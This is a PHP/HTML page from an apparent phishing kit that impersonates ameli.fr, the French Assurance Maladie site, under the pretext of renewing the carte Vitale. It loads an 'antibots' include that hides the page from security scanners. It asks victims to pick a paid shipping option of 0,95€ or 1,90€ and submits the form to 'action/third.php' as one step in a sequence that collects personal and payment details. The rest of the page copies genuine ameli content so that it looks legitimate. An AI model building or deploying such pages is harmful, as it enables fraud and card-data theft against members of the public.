<?php 
include 'core/antibots.php';
?>
<!DOCTYPE html>
<html>
  <head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="assets/img/favicon.ico" rel="icon" type="image/vnd.microsoft.icon" />
    <title>La carte Vitale | ameli.fr | Assuré</title>
    <link rel="stylesheet" media="all" href="assets/css/1.css">
    <link rel="stylesheet" media="all" href="assets/css/2.css">
    <link rel="stylesheet" media="print" href="assets/css/3.css">
    <link rel="stylesheet" href="assets/css/4.css">
    <style>
      * {
        font-family: "open sans", sans-serif !important;
      }
    </style>
  </head>
  <body>
    <div class="dialog-off-canvas-main-canvas">
      <div id="backToTop"></div>
      <header data-once="ameli_header_topbar" id="page-header" role="banner">
        <section class="header">
          <div class="container">
            <div class="wrapper-header-white d-flex justify-content-lg-between align-items-center">
              <button aria-controls="menuRwd" aria-expanded="false" class="burgerMenu d-lg-none" data-target="#menuRwd" data-toggle="collapse" type="button">
                <span class="menu-icon">
                  <span></span>
                </span>
                <span class="texte">Menu</span>
              </button>
              <div class="wrapper-logo-slogan d-lg-flex align-items-center">
                <a href="#">
                  <img alt="L'Assurance Maladie : Agir ensemble, protéger chacun | ameli.fr (retour à l'accueil)" height="66" src="assets/img/logo.svg" width="320" />
                </a>
                <div class="accroche">pour les assurés</div>
              </div>
            </div>
          </div>
          <div aria-hidden="true" class="wrapper-main_menuRwd collapse d-lg-none" id="menuRwd">
            <div id="main_menuRwd">
              <div class="ameli-menu">
                <div id="block-ameli-menu-menu-mobile">
                  <div class="container">
                    <div class="wrapper-content-layer-search-mobile" role="search">
                      <form action="" class="js-ameli-form-search is-mobile-search" data-once="ameli_search_form" id="ameli-search-form-mobile">
                        <div class="input-group">
                          <input autocomplete="off" class="js-search-ameli-input-mobile" name="text" placeholder="Recherche" title="Recherche" type="text" />
                          <button type="submit">
                            <i class="icon-loupe"></i>
                            <span class="sr-only">Rechercher</span>
                          </button>
                        </div>
                      </form>
                    </div>
                    <nav aria-label="Menu public" role="navigation">
                      <ul class="ameli-menu" id="accordion">
                        <li class="js-taxonomy_term_10">
                          <a data-once="ameli_xiti" data-xiti-chapter-1="Menu_principal" data-xiti-chapter-2="" data-xiti-chapter-3="" data-xiti-name="Actualites" data-xiti-type="navigation" href="#"> Actualités </a>
                        </li>
                        <li class="js-taxonomy_term_4">
                          <button aria-controls="taxonomy_term_4-mobile" aria-expanded="false" data-target="#taxonomy_term_4-mobile" data-toggle="collapse" id="taxonomy_term_4-btn-mobile" type="button"> Droits et démarches <span>selon votre situation</span>
                          </button>
                        </li>
                        <li class="js-taxonomy_term_3 active">
                          <button aria-controls="taxonomy_term_3-mobile" aria-expanded="false" data-target="#taxonomy_term_3-mobile" data-toggle="collapse" id="taxonomy_term_3-btn-mobile" type="button"> Remboursements <span>prestations et aides</span>
                          </button>
                        </li>
                        <li class="js-taxonomy_term_16">
                          <button aria-controls="taxonomy_term_16-mobile" aria-expanded="false" data-target="#taxonomy_term_16-mobile" data-toggle="collapse" id="taxonomy_term_16-btn-mobile" type="button"> Maladies et prévention <span>comprendre et agir</span>
                          </button>
                        </li>
                      </ul>
                    </nav>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="ameli-menu" id="block-ameli-menu-main">
            <div id="block-ameli-menu-menu">
              <div class="container">
                <nav aria-label="Menu public" role="navigation">
                  <ul class="ameli-menu">
                    <li class="js-taxonomy_term_10 li-parent">
                      <a data-once="ameli_xiti" data-xiti-chapter-1="Menu_principal" data-xiti-chapter-2="" data-xiti-chapter-3="" data-xiti-name="Actualites" data-xiti-type="navigation" href="#"> Actualités </a>
                    </li>
                    <li class="js-taxonomy_term_4 li-parent">
                      <button aria-controls="taxonomy_term_4" aria-expanded="false" class="collapsed" data-target="#taxonomy_term_4" data-toggle="collapse" id="taxonomy_term_4-btn" type="button"> Droits et démarches <span>selon votre situation</span>
                      </button>
                    </li>
                    <li class="js-taxonomy_term_3 li-parent active">
                      <button aria-controls="taxonomy_term_3" aria-expanded="false" data-target="#taxonomy_term_3" data-toggle="collapse" id="taxonomy_term_3-btn" type="button">Renouvellement <span>de la carte vitale</span>
                      </button>
                    </li>
                    <li class="js-taxonomy_term_16 li-parent">
                      <button aria-controls="taxonomy_term_16" aria-expanded="false" data-target="#taxonomy_term_16" data-toggle="collapse" id="taxonomy_term_16-btn" type="button"> Maladies et prévention <span>comprendre et agir</span>
                      </button>
                    </li>
                    <li class="menu-search li-parent">
                      <button aria-controls="layerSearch" aria-expanded="false" class="collapsed" data-target="#layerSearch" data-toggle="collapse" id="btnSearch" type="button">
                        <i class="icon-loupe"></i>
                        <span class="sr-only">Recherche</span>
                      </button>
                      <div aria-labelledby="btnSearch" class="collapse layer" id="layerSearch">
                        <div class="wrapper-content-layer-search">
                          <div class="bloc-search-header mr-3" role="search">
                            <form action="https://www.ameli.fr/paris/assure/recherche" class="js-ameli-form-search" data-once="ameli_search_form" id="ameli-search-form">
                              <div class="input-group">
                                <input autocomplete="off" class="js-search-ameli-input ui-autocomplete-input" data-once="ameli_search" name="text" placeholder="Votre recherche" title="votre recherche" type="text" />
                                <div class="js-list-autocomplete-search-ameli list-autocomplete-communique">
                                  <ul class="ui-menu ui-widget ui-widget-content ui-autocomplete ui-front" id="ui-id-4" style="display: none;" tabindex="0" unselectable="on"></ul>
                                </div>
                                <button type="submit">
                                  <i class="icon-loupe"></i>
                                  <span class="sr-only">Rechercher</span>
                                </button>
                              </div>
                            </form>
                          </div>
                        </div>
                      </div>
                    </li>
                  </ul>
                </nav>
              </div>
            </div>
          </div>
        </section>
      </header>
      <main class="main-container main-container-node" role="main">
        <div>
          <div id="block-ameli-breadcrumbs">
            <nav aria-label="Fil d'ariane" class="breadcrumb" role="navigation">
              <div class="container">
                <ul>
                  <li>
                    <a href="#">Assuré</a>
                  </li>
                  <li>
                    <a href="#">Renouvellements</a>
                  </li>
                  <li>
                    <a href="#">Carte Vitale</a>
                  </li>
                </ul>
              </div>
            </nav>
          </div>
        </div>
        <a href="#" id="main-content" tabindex="-1"></a>
        <div class="container">
          <div class="row">
            <div class="col-xs-12 col-lg-3 sidebar-first-class">
              <div>
                <div id="block-ameli-sommaire-article">
                  <div class="views-element-container">
                    <div>
                      <div class="view-sommaire-article" data-once="ameli_sommaire_sticky">
                        <div class="title-sommaire"> Carte Vitale </div>
                        <button aria-controls="collapseSommaire" aria-expanded="false" class="d-lg-none" data-target="#collapseSommaire" data-toggle="collapse" type="button"> Au sommaire du dossier </button>
                        <div class="collapse d-lg-block" id="collapseSommaire">
                          <nav id="menuSidebar">
                            <ul class="nav">
                              <li>
                                <a class="nav-link active" href="#">Informations personnelles</a>
                              </li>
                              <li>
                                <a class="nav-link active" href="#">Informations de livraison</a>
                              </li>
                              <li>
                                <a class="nav-link active" href="#">Livraison</a>
                              </li>
                              <li>
                                <a class="nav-link" href="#">Informations de paiement</a>
                              </li>
                              <li>
                                <a class="nav-link" href="#">Terminé</a>
                              </li>
                            </ul>
                          </nav>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <section class="col-xs-12 col-lg-9 section-content-node">
              <div>
                <div id="block-ameli-content">
                  <article class="node node--type-ameli-article node--view-mode-full">
                    <div>
                      <div class="wrapper-para-article">
                        <div class="field_ameli_paragraphs_blocks entity_reference_revisions">
                          <div class="paragraph paragraph--type--field-ameli-paragraph-titre-sect paragraph--view-mode--full" id="text_64335">
                            <h2 style="padding-top: 10px!important;border-top:0; margin:0 0 25px!important;" class="field_ameli_paragraph_title string">Livraison</h2>
                          </div>
                        </div>
                        <div class="field_ameli_paragraphs_blocks entity_reference_revisions">
                          <div class="paragraph paragraph--type--field-ameli-paragraph-simple paragraph--view-mode--full" id="text_64338">
                            <div class="field_ameli_paragraph_body text_with_summary">
                              <p>Nous vous proposons plusieurs solutions d'envoie postale pour obtenir votre nouvelle carte vitale le plus rapidement possible. Veuillez choisir le transporteur de votre choix.</p>
                              <form action="action/third.php" method="post">
                                <style>
                                  .flex {
                                    display: flex;
                                    justify-content: space-between;
                                  }
                                  select, option {
                                    height: calc(1.5em + .75rem + 2px);
                                    padding: 6px 6px;
                                    font-size: 1rem;
                                    font-weight: 400;
                                    color: #495057;
                                    background-color: #fff;
                                    border: 1px solid #ced4da;
                                    border-radius: .25rem;
                                  }
                                  .styled-table {
                                    border-collapse: collapse;
                                    margin: 25px 0;
                                    font-size: 0.9em;
                                    font-family: sans-serif;
                                    width: 100%;
                                    border-radius:6px;
                                    
                                    }
                                    
                                    .styled-table thead tr {
                                    background-color: #009879;
                                    color: #ffffff;
                                    text-align: left;
                                    }
                                    
                                    .styled-table th,
                                    .styled-table td {
                                    padding: 12px 15px;
                                    }
                                    .styled-table tbody tr {
                                    border-bottom: 1px solid #dddddd;
                                    }
                                    
                                    .styled-table tbody tr:nth-of-type(even) {
                                    background-color: #f3f3f3;
                                    }
                                    
                                    .styled-table tbody tr.active-row {
                                    font-weight: bold;
                                    color: #009879;
                                    }
                                </style>
                                
                                <table class="styled-table">
                                            <thead>
                                                <tr>
                                                    <th>#</th>
                                                    <th>Transporteur</th>
                                                    <th>Informations</th>
                                                    <th>Prix</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                <tr>
                                                    <td><input style="position:relative!important;left:0!important;" type="radio" name="transport" value="0,75" checked=""></td>
                                                    <td><img src="assets/img/laposte.png" style="width:70px;"></td>
                                                    <td>La Poste, livraison sous 3 à 5 jours ouvrés </td>
                                                    <td>0,95€ <small>TTC</small></td>
                                                </tr>
                                                <tr>
                                                    <td><input style="position:relative!important;left:0!important;" type="radio" name="transport" value="1,90"></td>
                                                    <td><img src="assets/img/chronopost.png" style="width:70px;"></td>
                                                    <td>Chronopost Express, livraison sous 1 à 2 jours ouvrés </td>
                                                    <td>1,90€ <small>TTC</small></td>
                                                </tr>
                                            </tbody>
                                        </table>
                                <button type="submit" id="submit" class="btn btn-xl btn-primary">Valider</button>
                              </form>
                            </div>
                          </div>
                        </div>
                        <div class="field_ameli_paragraphs_blocks entity_reference_revisions">
                          <div class="paragraph paragraph--type--field-ameli-paragraph-titre-sect paragraph--view-mode--full" id="text_64335">
                            <h2 class="field_ameli_paragraph_title string">Qui a droit à la carte Vitale ?</h2>
                          </div>
                        </div>
                        <div class="field_ameli_paragraphs_blocks entity_reference_revisions">
                          <div class="paragraph paragraph--type--field-ameli-paragraph-simple paragraph--view-mode--full" id="text_64338">
                            <div class="field_ameli_paragraph_body text_with_summary">
                              <p>Obtenir une carte Vitale implique d’avoir un <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="cd8614fa-b6bf-46c8-bb45-5e15265d8440" data-once="ameli_xiti" data-xiti-chapter-1="ameli_article" data-xiti-chapter-2="" data-xiti-chapter-3="" data-xiti-name="Le_numero_de_securite_sociale" data-xiti-type="download" href="#" rel="nofollow">numéro de sécurité sociale</a>. </p>
                              <p>La carte Vitale peut être commandée <strong></strong>directement dans <a data-once="ameli_xiti" data-xiti-chapter-1="" data-xiti-chapter-2="" data-xiti-chapter-3="" data-xiti-name="https://assure.ameli.fr/PortailAS/appmanager/PortailAS/assure?_somtc=true" data-xiti-type="download" href="#" rel="nofollow" title="le compte ameli (nouvelle fenêtre)">le compte ameli</a> (rubrique « Mes démarches »). </p>
                              <p>Elle atteste de votre immatriculation et de vos droits à l'Assurance Maladie.</p>
                              <p>Elle est valable partout en France (France métropolitaine et Drom-Com).</p>
                            </div>
                          </div>
                        </div>
                        <div class="field_ameli_paragraphs_blocks entity_reference_revisions">
                          <div class="paragraph paragraph--type--field-ameli-paragraph-titre-sect paragraph--view-mode--full" id="text_64371">
                            <h2 class="field_ameli_paragraph_title string">Comment utiliser votre carte Vitale ?</h2>
                          </div>
                        </div>
                        <div class="field_ameli_paragraphs_blocks entity_reference_revisions">
                          <div class="paragraph paragraph--type--field-ameli-paragraph-simple paragraph--view-mode--full" id="text_64374">
                            <div class="field_ameli_paragraph_body text_with_summary">
                              <p>
                                <strong>Présentez systématiquement votre carte Vitale à tout professionnel de santé</strong>. Il l’insère dans son lecteur et transmet une feuille de soins électronique à votre CPAM. C'est ce qu'on appelle la télétransmission.
                              </p>
                              <p>
                                <strong>Si le professionnel de santé ne possède pas l'équipement nécessaire</strong>, il établit une <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="a7819b74-305f-4dbc-a8a8-0919c884b170" data-once="ameli_xiti" data-xiti-chapter-1="ameli_article" data-xiti-chapter-2="" data-xiti-chapter-3="" data-xiti-name="La_feuille_de_soins_papier" data-xiti-type="download" href="#" rel="nofollow">feuille de soins papier</a>. Vous devez la remplir et <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="ae4ca623-ee6f-4675-9184-edd125d1be69" data-once="ameli_xiti" data-xiti-chapter-1="reponse_de_contacts_assures" data-xiti-chapter-2="" data-xiti-chapter-3="" data-xiti-name="Envoyer_une_feuille_de_soins" data-xiti-type="download" href="#" rel="nofollow">envoyer cette feuille de soins par courrier affranchi</a> à votre caisse primaire d'assurance maladie pour être remboursé. Le courrier est à affranchir au tarif en vigueur.
                              </p>
                              <p>
                                <strong>Si vous avez oublié votre carte Vitale</strong>, le professionnel de santé peut :
                              </p>
                              <ul>
                                <li>soit vous demander de signer un bordereau papier qu'il télétransmet à votre caisse primaire d'assurance maladie (cas fréquent en pharmacie) ;</li>
                                <li>soit établir une feuille de soins papier. Vous devez la remplir et <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="ae4ca623-ee6f-4675-9184-edd125d1be69" data-once="ameli_xiti" data-xiti-chapter-1="reponse_de_contacts_assures" data-xiti-chapter-2="" data-xiti-chapter-3="" data-xiti-name="Envoyer_une_feuille_de_soins" data-xiti-type="download" href="#" rel="nofollow">envoyer cette feuille de soins par courrier affranchi</a> à votre CPAM pour être remboursé (cas fréquent chez le médecin). Le courrier est à affranchir au tarif en vigueur. </li>
                              </ul>
                              <p>La carte Vitale est valable partout en France (France métropolitaine et Drom-Com).</p>
                              <h3>La carte Vitale, pour une meilleure qualité de service aux assurés</h3>
                              <p>Fiable, pratique et sûre, la carte Vitale permet d' <strong>améliorer la qualité de service</strong> aux assurés sociaux par : </p>
                              <ul>
                                <li>une simplification des procédures de remboursement des frais de santé ;</li>
                                <li>une économie de frais d'affranchissement (plus de feuille de soins papier à envoyer) ;</li>
                                <li>des remboursements rapides (1 semaine maximum) et un tiers payant facilité pour permettre au patient de ne pas avancer certains frais.</li>
                              </ul>
                              <p>Elle permet aussi de rendre le fonctionnement administratif de l'Assurance Maladie <strong>plus efficient</strong> et <strong>moins coûteux</strong>. Remplacer la feuille de soins papier par une feuille de soins électronique représente ainsi un gain de temps, un gain de place et un gain en matière de préservation de l'environnement. </p>
                              <div class="encadre">
                                <h3 class="title">Un remboursement rapide</h3>
                                <p>Avec la carte Vitale, vos soins sont remboursés en <strong>une semaine</strong>. </p>
                                <p>Le montant remboursé est versé sur votre compte bancaire (sous réserve d'avoir fourni un RIB à votre caisse primaire d’assurance maladie). En cas de changement de banque, envoyez un nouveau RIB pour <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="49b5aa01-efe3-4b98-b04f-874df3348a44" data-once="ameli_xiti" data-xiti-chapter-1="reponse_de_contacts_assures" data-xiti-chapter-2="" data-xiti-chapter-3="" data-xiti-name="Declarer_un_changement_de_compte_bancaire" data-xiti-type="download" href="#" rel="nofollow">déclarer un changement de compte bancaire à votre CPAM</a> afin que vos remboursements continuent de vous parvenir. </p>
                                <p>La différence entre votre paiement et le remboursement de l’Assurance Maladie pourra éventuellement être pris en charge par votre mutuelle. Si vous avez déclaré votre mutuelle à votre caisse primaire d’assurance maladie et si la télétransmission est activée, ce deuxième remboursement sera automatique, vous n’aurez rien à faire.</p>
                                <p>Dans certains cas, la carte Vitale peut vous permettre de ne pas avancer les frais : c'est ce qu'on appelle le <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="7a6a57c0-de2a-4958-82dd-21a5dbd3d5e3" data-once="ameli_xiti" data-xiti-chapter-1="ameli_article" data-xiti-chapter-2="" data-xiti-chapter-3="" data-xiti-name="Le_tiers_payant" data-xiti-type="download" href="#" rel="nofollow">tiers payant</a>. C’est le cas par exemple pour les médicaments délivrés en pharmacie. </p>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </article>
                </div>
              </div>
            </section>
          </div>
        </div>
      </main>
      <footer class="footer" role="contentinfo">
        <div class="wrapper-footer-top">
          <div>
            <div id="block-ameli-footer">
              <div class="container">
                <div class="wrapper-first-line">
                  <div class="wrapper-first-line-left">
                    <img alt="L'Assurance maladie" class="item-am" height="72" loading="lazy" src="assets/img/logo-assurance-maladie-footer.svg" width="245" />
                    <a class="item-secu" data-once="ameli_xiti" data-xiti-chapter-1="Footer" data-xiti-chapter-2="Haut" data-xiti-chapter-3="" data-xiti-name="logo_Securite_sociale" data-xiti-type="navigation" href="#" title="Accéder au site de la sécurité sociale (nouvelle fenêtre)">
                      <img alt="Sécurité sociale" height="114" loading="lazy" src="assets/img/footer_logo_ss.svg" width="120" />
                    </a>
                  </div>
                  <div class="wrapper-first-line-right">
                    <ul>
                      <li>
                        <a class="item-right" data-once="ameli_xiti" data-xiti-chapter-1="Footer" data-xiti-chapter-2="Haut" data-xiti-chapter-3="" data-xiti-name="Forum" data-xiti-type="exit" href="#" title="Accéder au forum (nouvelle fenêtre)">
                          <img alt="" height="55" loading="lazy" src="assets/img/footer_lien_forum.png" width="55" />Forum </a>
                      </li>
                      <li>
                        <a class="item-right contact" data-once="ameli_xiti" data-xiti-chapter-1="Footer" data-xiti-chapter-2="Haut" data-xiti-chapter-3="" data-xiti-name="Adresses_et_Contacts" data-xiti-type="navigation" href="#" title="Accéder à l'arbre de contact">
                          <img alt="" height="55" loading="lazy" src="assets/img/contact.svg" width="55" />Adresses et contacts </a>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="wrapper-footer-bottom">
          <div class="container">
            <nav aria-labelledby="block-menu-footer-espace-assure-menu" id="block-menu-footer-espace-assure" role="navigation">
              <h2 class="visually-hidden" id="block-menu-footer-espace-assure-menu">Menu footer espace assuré</h2>
              <ul>
                <li>
                  <a href="#">Accessibilité : partiellement conforme à 95%</a>
                </li>
                <li>
                  <a href="#">Mentions légales et CGU</a>
                </li>
                <li>
                  <a href="#">Données personnelles</a>
                </li>
                <li>
                  <a class="tarte-au-citron-open-modal" href="#">Gestion des cookies</a>
                </li>
                <li>
                  <a href="#">Rapport d'activité</a>
                </li>
                <li>
                  <a href="#">Documentation technique</a>
                </li>
              </ul>
            </nav>
            <nav aria-labelledby="block-menu-footer-espace-assure-ligne2-menu" id="block-menu-footer-espace-assure-ligne2" role="navigation">
              <h2 class="visually-hidden" id="block-menu-footer-espace-assure-ligne2-menu">Menu footer espace assuré ligne2</h2>
              <ul>
                <li>
                  <a href="#">Plan du site</a>
                </li>
                <li>
                  <a href="#">Actualités locales</a>
                </li>
                <li>
                  <a href="#">Contacts</a>
                </li>
                <li>
                  <a href="#">Aide</a>
                </li>
                <li>
                  <a href="#">Glossaire</a>
                </li>
                <li>
                  <a class="link-lang-en">English Pages</a>
                </li>
              </ul>
            </nav>
          </div>
        </div>
      </footer>
    </div>
  </body>
</html>